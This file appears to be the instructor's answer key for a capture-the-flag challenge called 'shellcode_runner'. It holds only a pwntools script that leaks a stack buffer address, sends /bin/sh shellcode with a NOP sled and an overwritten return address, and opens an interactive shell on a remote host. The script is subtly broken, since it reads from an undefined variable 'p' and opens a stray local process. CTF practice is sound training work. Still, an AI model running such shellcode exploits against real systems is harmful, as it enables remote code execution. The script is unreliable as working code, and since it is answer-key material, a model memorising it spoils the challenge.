[SOLUTION.md](https://github.com/user-attachments/files/34524301/SOLUTION.md)
# Easy 2 — shellcode_runner  (Instructor Only)
## Exploit
```python
from pwn import *

elf = context.binary = ELF("./chall")
io = elf.process()

context.arch = "amd64"

io = remote("hidryx.com", 5002)

io.recvuntil(b"at: ")

buf_addr = int(p.recvline().strip(), 16)

sc = asm(shellcraft.sh())

pay = sc
pay += b"\x90" * (136 - len(sc))    # NOP sled
pay += p64(buf_addr)                # RIP -> shellcode
pay  += b"C" * (200 - len(pay))     # fread 200

io.sendafter(b"shellcode:", pay)
io.interactive()
```
